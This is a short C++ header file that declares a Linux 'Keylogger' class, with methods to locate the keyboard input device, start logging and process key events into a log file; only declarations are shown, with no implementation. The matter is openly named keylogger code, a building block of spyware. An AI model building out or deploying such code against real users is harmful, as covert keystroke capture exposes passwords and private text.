#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#include <string>



class Keylogger {
public:
    Keylogger(std::string log_filename);
  
    bool start_logging();
private:
    void process_keys();
    std::string get_keyboard_path();

    std::string m_keyboard_path;
    std::string m_log_filename;
    int m_keyboard_fd;
    FILE* m_fptr;
    struct input_event m_ev;
};

#endif